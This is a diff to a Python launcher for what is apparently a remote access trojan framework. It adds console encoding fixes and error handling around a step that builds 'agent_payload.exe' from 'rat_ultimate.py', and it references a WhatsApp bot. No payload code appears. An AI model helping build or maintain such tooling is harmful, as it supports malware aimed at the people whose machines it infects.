@@ -11,6 +11,11 @@ Unified command for running all framework components
 import subprocess
 import sys
 
+# Fix encoding for Windows console
+if sys.platform == 'win32':
+    import io
+    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+
 def ensure_dependencies():
     """Auto-detect and install missing dependencies"""
     required_packages = {
@@ -89,31 +94,31 @@ class RATFramework:
         """Build agent executable"""
         print("\n" + "=" * 70)
         print("🏗️  Building Agent Executable")
-        print("=" * 70)
+        print("=" * 70 + "\n")
         
         try:
-            # Set UTF-8 encoding for Windows console compatibility
+            # Set UTF-8 encoding for console compatibility
             import os
             env = os.environ.copy()
             env['PYTHONIOENCODING'] = 'utf-8'
+            env['PYTHONWARNINGS'] = 'ignore'
             
+            # Run without capturing output to avoid encoding issues
             result = subprocess.run(
-                [sys.executable, 'rat_executable_builder.py', 'rat_ultimate.py', '-o', 'build/agent_payload.exe'],
+                [sys.executable, '-u', 'rat_executable_builder.py', 'rat_ultimate.py', '-o', 'build/agent_payload.exe'],
                 cwd=self.workspace,
-                capture_output=True,
-                text=True,
                 env=env
             )
-            print(result.stdout)
+            
             if result.returncode == 0:
-                print("✓ Agent built successfully")
+                print("\n✓ Agent built successfully")
                 print(f"Output: {self.workspace}/build/agent_payload.exe")
             else:
-                print("✗ Build failed")
-                if result.stderr:
-                    print(result.stderr)
+                print("\n✗ Build failed")
+        except KeyboardInterrupt:
+            print("\n\n✗ Build cancelled by user")
         except Exception as e:
-            print(f"✗ Error: {e}")
+            print(f"\n✗ Error: {e}")
     
     def run_bot(self):
         """Start WhatsApp Bot"""
